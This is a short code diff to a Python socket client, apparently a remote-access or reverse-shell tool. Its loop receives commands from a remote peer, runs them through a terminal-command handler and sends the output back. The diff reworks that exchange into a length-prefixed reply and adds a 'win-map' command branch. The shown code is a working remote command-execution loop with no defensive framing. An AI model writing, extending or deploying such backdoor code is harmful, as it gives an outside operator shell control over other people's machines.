@@ -38,10 +38,13 @@ class Client(socket.socket):
                 while True:
                     cmd = self.recv(1024).decode()
                     if cmd != "e--":
-                        self.send(cc.terminalCommands(cmd).encode())
+                        resp = cc.terminalCommands(cmd)
+                        result = { str(len(resp)) : resp }
+                        self.send(str(result).encode())
+                        self.send(resp.encode())
+
                     if cmd == "e--":
                         cc.terminalCommands(cmd)
-                        self.send(b"exited")
                         break
             
             elif commands == "win-map":
@@ -55,6 +58,7 @@ class Client(socket.socket):
                     else:
                         self.send(b"exited")
                         break
+
 def main():
     try:
         Client()
